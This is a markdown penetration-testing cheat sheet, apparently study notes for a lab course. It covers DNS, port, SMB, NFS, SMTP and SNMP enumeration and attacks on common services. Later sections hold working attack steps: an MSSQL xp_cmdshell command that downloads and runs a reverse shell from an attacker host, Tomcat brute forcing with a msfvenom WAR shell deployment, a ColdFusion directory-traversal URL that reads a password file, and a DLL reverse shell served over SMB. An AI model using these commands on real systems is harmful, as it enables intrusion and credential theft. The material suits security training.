# Active Reconnaissance

## Table of Contents
- [DNS Enumeration](#dns-enumeration)
  - [Interacting with a DNS Server](#interacting-with-a-dns-server)
    - [Host](#host)
    - [Nslookup](#nslookup)
    - [Dig](#dig)
  - [Forward Lookup Brute Force](#forward-lookup-brute-force)
  - [Reverse Lookup Brute Force](#reverse-lookup-brute-force)
  - [DNS Zone Transfers](#dns-zone-transfers)
  - [Relevant Tools in Kali Linux](#relevant-tools-in-kali-linux)
- [Port Scanning](#port-scanning)
  - [Vulnerability Scanning with Nmap](#vulnerability-scanning-with-nmap)
  - [Masscan](#masscan)
- [SMB](#smb)
  - [SMB Theory](#smb-theory)
  - [SMB Enumeration](#smb-enumeration)
    - [Eternal Blue](#eternal-blue)
    - [Eternal Red](#eternal-red)
- [NFS Enumeration](#nfs-enumeration)
- [SMTP Enumeration](#smtp-enumeration)
- [SNMP Enumeration](#snmp-enumeration)
- [21 - Pentesting FTP](#21---pentesting-ftp)
- [22 - Pentesting SSH](#22---pentesting-ssh)
- [110,995 - Pentesting POP](#110995---pentesting-pop)
- [1433 - Pentesting MSSQL - Microsoft SQL Server](#1433---pentesting-mssql---microsoft-sql-server)
- [3306 - Pentesting Mysql](#3306---pentesting-mysql)
  - [Privilege Escalation](#privilege-escalation) 
- [TOMCAT enumeration](#tomcat-enumeration)
- [IIS - Internet Information Services](#iis---internet-information-services)
- [Cold Fusion](#cold-fusion)

## DNS Enumeration
### Interacting with a DNS Server
Each domain can use different types of DNS records. Some of the most common types of DNS records include:
- *NS* - Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- *A* - Also known as a host record, the "a record" contains the IP address of a hostname (such as www.megacorpone.com).
- *MX* - Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- *PTR* - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
- *CNAME* - Canonical Name Records are used to create aliases for other host records.
- *TXT* - Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.

#### Host
<details>
  <summary>host command</summary>

- Using **host** to find the *A* host record for `www.megacorpone.com`:
    ```sh 
    kali@kali:~$ host www.megacorpone.com
    www.megacorpone.com has address 38.100.193.76
    ```
- Using host to find the *MX* and *TXT* records for megacorpone.com
    ```sh 
    kali@kali:~$ host -t mx megacorpone.com
    megacorpone.com mail is handled by 10 fb.mail.gandi.net.
    megacorpone.com mail is handled by 50 mail.megacorpone.com.
    megacorpone.com mail is handled by 60 mail2.megacorpone.com.
    megacorpone.com mail is handled by 20 spool.mail.gandi.net.

    kali@kali:~$ host -t txt megacorpone.com
    megacorpone.com descriptive text "Try Harder"
    ```
:exclamation::exclamation::exclamation: **Note**: When using the host command either use:
- `host <domain_name> <NS_ip>`
- Comment out existing text inside **/etc/resolv.conf**. The only value that need to be there is the IP of the NS you've identified:
`nameserver <IP>`
</details>

#### Nslookup
<details>
  <summary>nslookup command</summary>
  
- Synopsis
    ```sh
    nslookup [-option] host [server]
    ```
- using nslookup to find *ANY* record
    ```
    kali@kali:~$ nslookup -query=<record type> megacorpone.com [ns server ip]
    ```
 
</details>

#### Dig
<details>
  <summary>dig command</summary>
  
- Synopsis
    ```sh
    dig  [@server]  [-b address] [-c class] [-f filename] [-k filename] [-m] [-p port#] [-q name] [-t type] [-v] [-x addr] [-y [hmac:]name:key] [ [-4] | [-6] ] [name] [type] [class] [queryopt...]
    ```
- using dig to find *ANY* record
    ```
    kali@kali:~$ dig @192.168.147.149 dc.mailman.com any
    ```
The default query record is *A*. Moreover, you can see several other information that may make the output more difficult to read. To simplify the output, we will be using those extra parameters on the following commands (order matters!!):
- `+nocmd` – Removes the `+cmd` options output.
- `+noall` – Removes extra headers, flags, time information, message size, etc.
- `+answer` – Tells dig to return the answer section (the "juicy" part of the output).
```sh
dig +nocmd @192.168.147.149 dc.mailman.com <record> +noall +answer
```

</details>

Ref: [DNS Enumeration Techniques in Linux](https://resources.infosecinstitute.com/topic/dns-enumeration-techniques-in-linux/)
### Forward Lookup Brute Force
By using a wordlist that contains common hostnames, we can attempt to guess DNS records and check the response for valid hostnames.
We use *forward lookups*, which request the IP address of a hostname.

```sh
kali@kali:~$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```
The list.txt file can be custom. Much more comprehensive wordlists are available as part of the [SecLists project](https://github.com/danielmiessler/SecLists). These wordlists can be installed to the **/usr/share/seclists/** directory using the **sudo apt install seclists** command. We'll use **/usr/share/seclists/Discovery/DNS/**.
### Reverse Lookup Brute Force
```sh
kali@kali:~$ for ip in $(seq  50 100); do host 38.100.193.$ip; done | grep -v "not found"
```
### DNS Zone Transfers
A zone transfer is basically a database replication between related DNS servers in which the *zone file* is copied from a master DNS server to a slave server. The zone file contains a list of all the DNS names configured for that zone. 

**Note**: Zone transfers should only be allowed to authorized slave DNS servers but many administrators misconfigure their DNS servers, and in these cases, anyone asking for a copy of the DNS server zone will usually receive one.

- The host command syntax for performing a zone transfer is as follows:
    ```sh
    host -l <domain name> <dns server address>        # host -l megacorpone.com ns2.megacorpone.com
    ```
- We can use a [bash script to perform a DNS zone transfer](#file-dns-axfr-sh) (using host).
- The dig command syntax for performing a zone transfer is as follows:
    ```sh
    dig  [@server] [domain name] axfr                 # dig @192.168.147.149 _msdcs.mailman.com. axfr
    ```
### Relevant Tools in Kali Linux
#### DNSRecon
- Performing a zone transfer (`-t axfr`):
    ```sh
    kali@kali:~$ dnsrecon -d megacorpone.com [-n NS_SERVER] -t axfr
    ```
- Brute forcing (`-t brt`) hostnames 
    ```sh
    kali@kali:~$ dnsrecon -d megacorpone.com [-n NS_SERVER] -D ~/list.txt -t brt
    ```
#### DNSenum
- Performing a zone transfer:
    ```sh
    kali@kali:~$ dnsenum megacorpone.com
    ```

## Port Scanning
### Stealth / SYN Scan
Nmap's preferred scanning technique is a SYN, or "stealth" scan. 
- It's the default scan technique used when no scan technique is specified and user has the required raw sockets privileges.
- It'sna TCP port scanning method that involves sending SYN packets without completing a TCP handshake.
```sh
kali@kali:~$ sudo nmap -sS 10.11.1.220
```
### TCP Connect Scan
When a user running nmap does not have raw socket privileges, Nmap will default to the TCP connect scan. 
- Because Nmap has to wait for the connection to complete before the API will return the status of the connection, takes much longer to complete.
```sh
kali@kali:~$ nmap -sT 10.11.1.220
```
### UDP Scanning
Nmap will use a combination of two different methods:
1. the "ICMP port unreachable" method by sending an empty packet to a given port.
2. for common ports it will send a protocol-specific packet.
```sh
kali@kali:~$ sudo nmap -sU 10.11.1.220
```
### The Complete Picture
The UDP scan (**-sU**) can be used in conjunction with a TCP SYN scan (**-sS**):
```sh
kali@kali:~$ sudo nmap -sU -sS 10.11.1.220
```

### Network Sweeping

```sh
kali@kali:~$ nmap -sn 10.11.1.1-254
```
### OS Fingerprinting
```sh
sudo nmap -O 10.11.1.220
```    
### Other options

#### Various Port Options
```sh
nmap -p 1-65535 10.11.1.220               # Scan all ports
nmap -p- 10.11.1.220                      # Scan all ports
nmap -p 80 10.11.1.220                    # Scan port 80
nmap -sT -A --top-ports=20 10.11.1.220    # Scan top ports
```
- the top twenty nmap ports are available in `/usr/share/nmap/nmap-services`.

#### Greppable output parameters
```sh
nmap -v -sn 10.11.1.1-254 -oG pinw-sweep.txt
grep Up ping-sweep.txt | cut -d" " -f 2           # Filters the Up ip addresses only.
```
#### Banner Grabbing / Service enumeration
```sh
nmap -sV -sT -A 10.11.1.220
```
### Nmap Scripting Engine (NSE)

NSE scripts are in `/usr/share/nmap/scripts`.
```sh
nmap 10.11.1.220 --script=smb-os-discovery
nmap --script-help dns-zone-transfer
```

### Vulnerability Scanning with Nmap
```sh
kali@kali:~$ sudo nmap -A -sV --script=default,vuln -p- --open -oN enum/vuln.nmap $IP
```
### Masscan


## SMB 
### SMB Theory
Windows exposes several administrative and hidden shares via SMB by default. Three common shares on Windows machines are:
- **C$**: allows one to access the C Drive on the remote machine.
- **Admin$**: allows one to access the Windows installation directory. 
- **IPC$**: used to facilitate inter-process communication more commonly referred to as IPC.

### SMB Enumeration
The NetBIOS service listens on TCP port 139 as well as several UDP ports. SMB (TCP port 445) and NetBIOS are two separate protocols.

- Using nmap to scan for SMB vulnerabilities
    ```sh
    kali@kali:~$ nmap --script "smb-vuln*" -p445 $IP -oN enum/smb-vuln.nmap
    ```
#### Eternal Blue
- If it is vulnerable to "MS17-010" use [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010). 
  - `python eternal_checker.py $IP`
  - `zzz_exploit.py` works for Windows XP and if the target system has a firewall.
#### Eternal Red
- If it is vulnerable to "SAMBA CVE-2017-7494" use [CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494). 
  - Samba in **4.5.9** version and before that is vulnerable to a remote code execution vulnerability named **SambaCry** (aka **Eternal Red**).
  - `python2 cve_2017_7494.py -t $IP -o1 --rhost=<Kali_IP> --rport=<Kali_Port>`
- It won't work out of the box because iptables (aka, Linux firewall) is blocking the outbound connections. So you need to edit file "implant.c" and add line `system("iptables -F");` between `change_to_root_user();` and `detach_from_parent();`, which removes all the active rules in iptables.

- Using nmap to scan for the NetBIOS service
    ```sh
    kali@kali:~$ nmap -v -p 139,445 -oG smb.txt $IP
    kali@kali:~$ nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $IP
    ```
- Using **nbtscan** to collect additional NetBIOS information
    ```sh
    kali@kali:~$ sudo nbtscan -r 10.11.1.0/24
    Doing NBT name scan for addresses from 10.11.1.0/24

    IP address       NetBIOS Name     Server    User             MAC address      
    ------------------------------------------------------------------------------
    10.11.1.5        ALICE            <server>  ALICE            00:50:56:89:35:af
    10.11.1.31       RALPH            <server>  HACKER           00:50:56:89:08:19
    10.11.1.24       PAYDAY           <server>  PAYDAY           00:00:00:00:00:00
    ...
    ```

#### enum4linux and [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
`Enum4linux` is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB.

0. Install it from github:
    ```sh
    kali@kali:~$ git clone https://github.com/cddmp/enum4linux-ng.git
    kali@kali:~$ cd enum4linux-ng
    kali@kali:~$ sudo python setup.py install     # Installs the binary in /usr/local/bin
    ```
1. Enumeration:
    ```sh
    kali@kali:~$ enum4linux-ng -A $IP -oA OUT_FILE       # Do all simple enumeration including nmblookup
    ```
#### [smbmap](https://github.com/ShawnDEvans/smbmap)
- Check permissions on SMB shares:
    ```sh
    kali@kali:~$ smbmap -H <host> [-u USERNAME -p PASSWORD -d DOMAIN]
    ```
- Return the OS version of the remote host:
    ```sh
    kali@kali:~$ smbmap -H $IP -v
    [+] 10.11.1.5:445 is running Windows 5.1 (name:ALICE) (domain:THINC)
    ```
#### smbclient
Smbclient is a tool used to access SMB resources on a server.

1. Connecting to SMB. Now, it will prompt us to enter root's password, but if it isn't configured properly, we can log in anonymously by simply hitting Enter at the prompt. If null sessions are allowed (we can log in with a blank username and password) use the **-U** flag to specify the username (a blank string) and the **-N** flag to specify no password:
    ```sh
    kali@kali:~$  smbclient //$IP/ -U '' -N
    Try "help" to get a list of possible commands.
    smb: \> 
    ```

Ref: [Enumerate SMB with Enum4linux & Smbclient](https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/)
## NFS Enumeration
Network File System (NFS) is a distributed file system protocol which allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage.
### Scanning for NFS Shares
Using nmap to identify hosts that have portmapper/rpcbind running.
```sh
kali@kali:~$ nmap -v -p 111 10.11.1.1-254
```
The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service. 

Querying rpcbind in order to get registered services
```sh
kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
```
### Nmap NFS NSE Scripts
Locating various NSE scripts for NFS (and executing them
```sh
kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
...
Nmap scan report for 10.11.1.72

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /home 10.11.0.0/255.255.0.0
```
In this case, the entire `/home` directory is being shared and we can access it by mounting it on our Kali virtual machine. We will use `mount` to do this, along with `-o nolock` to disable file locking, which is often needed for older NFS servers:
```sh
kali@kali:~$ mkdir home
kali@kali:~$ sudo mount -o nolock 10.11.1.72:/home ~/home/
kali@kali:~$ cd home/ && ls
jenny  joe45  john  marcus  ryuu
```
## SMTP Enumeration
We can also gather information about a host or network from vulnerable mail servers. The Simple Mail Transport Protocol (SMTP) supports several interesting commands, such as :
- `VRFY`, asks the server to verify an email address, 
- `EXPN`, the server for the membership of a mailing list.   

These can often be abused to verify existing users on a mail server. 

Using `nc` to validate SMTP users:
```sh
kali@kali:~$ nc -nv 10.11.1.217 25
(UNKNOWN) [10.11.1.217] 25 (smtp) open
220 hotline.localdomain ESMTP Postfix
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
^C
```
### [smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/)
```sh
root@kali:~# smtp-user-enum ( -M VRFY | EXPN | RCPT) ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
```

- [SMTP Commands Reference](https://www.samlogic.net/articles/smtp-commands-reference.htm)
## SNMP Enumeration
SNMP is based on UDP, a simple, stateless protocol, and is therefore susceptible to IP spoofing and replay attacks.
In addition, the commonly used SNMP protocols 1, 2, and 2c offer no traffic encryption, meaning that SNMP information and credentials can be easily intercepted over a local network. 
### The SNMP MIB Tree
The SNMP Management Information Base (MIB) is a database containing information usually related to network management. 
### Scanning for SNMP
Using nmap to perform a SNMP scan
```sh
kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
...
Host is up (0.080s latency).

PORT    STATE         SERVICE
161/udp open|filtered snmp
MAC Address: 00:50:56:89:1A:CD (VMware)
...
```
Alternatively, we can use a tool such as [onesixtyone](http://www.phreedom.org/software/onesixtyone/), which will attempt a brute force attack against a list of IP addresses. First we must build text files containing community strings and the IP addresses we wish to scan:
```sh
kali@kali:~$ echo public > community
kali@kali:~$ echo private >> community
kali@kali:~$ echo manager >> community

kali@kali:~$ for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips

kali@kali:~$ onesixtyone -c community -i ips
Scanning 254 hosts, 3 communities
10.11.1.14 [public] Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)
10.11.1.13 [public] Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)
10.11.1.22 [public] Linux barry 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686
...
```
Once we find SNMP services, we can start querying them for specific MIB data that might be interesting.
### Windows SNMP Enumeration Example
#### Enumerating the Entire MIB Tree

Using some of the MIB values provided, we can attempt to enumerate their corresponding values. Try out the following examples against a known machine in the labs, which has a Windows SNMP port exposed with the community string "public".

Using `snmpwalk` to enumerate the entire MIB tree
- `-c` option to specify the community string,  
- `-v` to specify the SNMP version number,
- `-t 10` to increase the timeout period to 10 seconds
```sh
kali@kali:~$ snmpwalk -c public -v1 -t 10 10.11.1.14
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (2005539644) 232 days, 2:56:36.44
iso.3.6.1.2.1.1.4.0 = ""
...
```
#### Enumerating Windows Users
```sh
kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = STRING: "bob"
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = STRING: "IUSR_BOB"
...
```
#### Enumerating Running Windows Processes
```sh
kali@kali:~$ snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "System"
...
```
#### Enumerating Open TCP Ports
```sh
kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = INTEGER: 21
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.45310 = INTEGER: 80
...
```
#### Enumerating Installed Software
```sh
kali@kali:~$ snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "LiveUpdate 3.3 (Symantec Corporation)"
...
```
  
Other Ref: [161,162,10161,10162/udp - Pentesting SNMP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
### 21 - Pentesting FTP
The Web server File Transfer Protocol (FTP) service can transfer any type of file between the Web server and an FTP client. 
- Using nmap:
    ```sh
    kali@kali:~$ nmap --script "ftp-*" -p 21 $IP
    ```
> **Common attack**: 
> Anonymous login + file upload (`binary` + `passive off`)

```
ftp $IP    # name:anonymous, pass: any
```

- Download all files from FTP
    ```sh
    wget -m ftp://anonymous:anonymous@$IP #Download all
    wget -m --no-passive ftp://anonymous:anonymous@$IP #Download all
    ```
- The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`. In here, you could find some dangerous settings:
  - `anonymous_enable=YES`
  - `anon_upload_enable=YES`
  - ...

Reference: [21 - Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
### 22 - Pentesting SSH
If you obtain the private ssh key of a user you can follow these instructions:
```sh
# Attacker@Kali
kali@kali:~$ vim private_ssh_key       #paste the private key here the key
kali@kali:~$ chmod 600 private_ssh_key
kali@kali:~$ ssh -i private_ssh_key root@$IP
```
A less common SSH vulnerability is [Weak SSH keys / Debian predictable PRNG](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#weak-ssh-keys-debian-predictable-prng).
### 110,995 - Pentesting POP
#### POP3 Login
```sh
kali@kali:~$ nc -nv <IP> 110
# kali@kali:~$ openssl s_client -connect <IP>:995 -crlf -quiet
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server lab ready <00004.1546827@lab>
USER offsec
+OK offsec welcome here
PASS offsec
-ERR unable to lock mailbox
quit
+OK POP3 server lab signing off.
```

Reference: [110,995 - Pentesting POP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop)
### 1433 - Pentesting MSSQL - Microsoft SQL Server
#### Automatic Enumeration
If you don't know nothing about the service:
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
```
#### Manual Enumeration
Login
```sh
# Using Impacket mssqlclient.py
impacket-mssqlclient [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
impacket-mssqlclient [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```
#### RCE
```sql
# if logged using impacket-mssqlclient
SQL> enable_xp_cmdshell
SQL> RECONFIGURE
SQL> xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
# If this didn't work use:
SQL> xp_cmdshell "powershell.exe wget http://192.168.119.147/rev.exe -OutFile c:\\Users\Public\\rev.exe"
SQL> xp_cmdshell  "c:\\Users\Public\\rev.exe"

```

Reference: [1433 - Pentesting MSSQL - Microsoft SQL Server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
### 3306 - Pentesting Mysql
#### Connect
- Local
    ```sh
    mysql -u root # Connect to root without password
    mysql -u root -p # A password will be asked (check someone)
    ```
- Remote
    ```
    mysql -h <Hostname> -u root
    mysql -h <Hostname> -u root@localhost
    ```
#### External Enumeration
Some of the enumeration actions require valid credentials
```sh
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP
```
#### Extracting MySQL credentials from files
Inside `/etc/mysql/debian.cnf` you can find the plain-text password of the user `debian-sys-maint`
```sh
cat /etc/mysql/debian.cnf
```
You can use these credentials to login in the mysql database.
Inside the file: `/var/lib/mysql/mysql/user.MYD` you can find all the hashes of the MySQL users (the ones that you can extract from mysql.user inside the database).
You can extract them doing (this doesn't work need to fix):
```sh
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
These hashes can be cracked using hashcat (`-m 300` - MySQL4.1/MySQL5).
#### Default MySQL Database/Tables
These tables are useless for the research:
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |    --> use mysql; select * from user;
| performance_schema |
| sys                |
+--------------------+
```
#### Privilege Escalation
[Privilege Escalation with MySQL 4.X/5.0 (Linux)](https://gist.github.com/A-Pisani/efa2a11cbf555e7e83c70c9406b730c6#mysql-case-study)
### TOMCAT enumeration
- It usually runs on **port 8080**.
- The most interesting path of Tomcat is `/manager/html`, inside that path you can upload and deploy `war` files (execute code). But this path is protected by basic HTTP auth. 
- Bruteforce 
    ```sh
    hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f -s 8080 $IP http-get /manager/html
    ```
- Finally, if you have access to the Tomcat Web Application Manager, you can upload and deploy a `.war` file (execute code).
    ```sh
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.177 LPORT=4242 -f war > reverse.war
    ```
- The malicious payload can be either uploaded manually from Tomcat Web Application Manager or using curl:
    ```sh
    curl --upload-file reverse.war -u "tomcat:s3cret" "http://$IP:8080/manager/text/deploy?path=/reverse"
    OK - Deployed application at context path [/reverse]
    # Now navigate to http://$IP/reverse
    ```

References:
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
- https://amirr0r.github.io/posts/htb-tabby/

### IIS - Internet Information Services
The possibility of executing a file on an IIS web server depends on the server's configuration and the file type being accessed. By default, IIS is configured to serve files but not execute them. However, if the server is configured to allow the execution of certain file types, then it is possible for those files to be executed on the server (in the **web.config** file).

You can check whether a server supports file execution or simple download by accessing a file with an executable extension (such as `.asp[x]`, `.php`, `.config` `.cgi`, `.pl`, etc.) and observing the server's behavior.

If the server is configured to execute files, then accessing a file with an executable extension will typically cause the server to execute the file and return the output to your browser. You may see a dynamic web page or some other type of server-generated content.
 
If the response header includes a Content-Type header with a value of:
- **text/html** or similar, then the server is likely executing the file. 
- **application/octet-stream** or similar, then the file is likely being served for download.


### Cold Fusion
```txt
80/tcp open  http    Microsoft IIS httpd 6.0
| http-cookie-flags: 
|   /CFIDE/administrator/enter.cfm: 
|     CFID: 
|       httponly flag not set
|     CFTOKEN: 
|       httponly flag not set
|   /CFIDE/administrator/entman/index.cfm: 
|     CFID: 
|       httponly flag not set
|     CFTOKEN: 
|       httponly flag not set
|   /CFIDE/administrator/archives/index.cfm: 
|     CFID: 
|       httponly flag not set
|     CFTOKEN: 
|_      httponly flag not set
| http-enum: 
|   /CFIDE/administrator/enter.cfm: ColdFusion Admin Console
|   /CFIDE/administrator/entman/index.cfm: ColdFusion Admin Console
|   /cfide/install.cfm: ColdFusion Admin Console
|   /CFIDE/administrator/archives/index.cfm: ColdFusion Admin Console
|   /CFIDE/wizards/common/_logintowizard.cfm: ColdFusion Admin Console
|_  /CFIDE/componentutils/login.cfm: ColdFusion Admin Console
|_http-title: Under Construction
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-methods: 
|_  Potentially risky methods: TRACE
| vulners: 
|   cpe:/a:microsoft:internet_information_services:6.0: 
|     	PACKETSTORM:93313	6.0	https://vulners.com/packetstorm/PACKETSTORM:93313	*EXPLOIT*
|     	CVE-2009-4445	6.0	https://vulners.com/cve/CVE-2009-4445
|_    	CVE-2009-4444	6.0	https://vulners.com/cve/CVE-2009-4444
| http-vuln-cve2010-2861: 
|   VULNERABLE:
|   Adobe ColdFusion Directory Traversal Vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:42342  CVE:CVE-2010-2861
|       Multiple directory traversal vulnerabilities in the administrator console
|       in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the
|       locale parameter
|     Disclosure date: 2010-08-10
|     Extra information:
|       
|     ColdFusion8
|       HMAC: 29CD6E8ED2107734A161F0C0891695CBE3EBC86A
|       Salt: 1676898888758
|       Hash: AAFDC23870ECBCD3D557B6423A8982134E17927E
|   
|     References:
|       https://www.securityfocus.com/bid/42342
|       http://www.blackhatacademy.org/security101/Cold_Fusion_Hacking
|       https://www.tenable.com/plugins/nessus/48340
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861
|_      https://nvd.nist.gov/vuln/detail/CVE-2010-2861
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/6.0
```
- There is a Cold Fusion console at http://10.11.1.10/CFIDE/administrator/enter.cfm. 
- Crack the hash for the password using:
    ```url
    http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
    ```
    - The hash we get is `AAFDC23870ECBCD3D557B6423A8982134E17927E` and can be cracked using crackstation: pass123. It coincides with the one found using nmap vuln scanning.
- once this hash is found we can log-in using admin / pass123.
- We can use a webshell for ColdFusion using `/usr/share/webshells/cfm/cfexec.cfm`. In this CMS under "debugging and logging" there is an ability to schedule a task. 
![image](https://user-images.githubusercontent.com/48137513/220129433-accc61f3-0175-4600-a89d-c70c73251249.png)
- The shceduled task can be run ASAP using "Scheduled Tasks" -> "Actions" -> "Run Scheduled Task".
- Browsing to "http://10.11.1.10/CFIDE/cfexec.cfm" we have our CFM web shell. We can get a reverse shell by using `rundll32.exe` to call a file from my SMB share I created on my kali box using IMPACKET. 
    - On kali generate a msfvenom reverse shell and start a SMB share with IMPACKET
      ```sh
      msfvenom -p windows/shell_reverse_tcp -f dll LHOST=192.168.x.x LPORT=443 -o shell.dll
      impacket-smbserver EXFIL . -smb2support
      ```
![image](https://user-images.githubusercontent.com/48137513/220131436-a0e2a8bf-ee90-4a92-a3fe-46f6dc822566.png)

Reference: [A Walk Down Adversary Lane – ColdFusion V8](https://www.drchaos.com/post/a-walk-down-adversary-lane-coldfusion-v8)
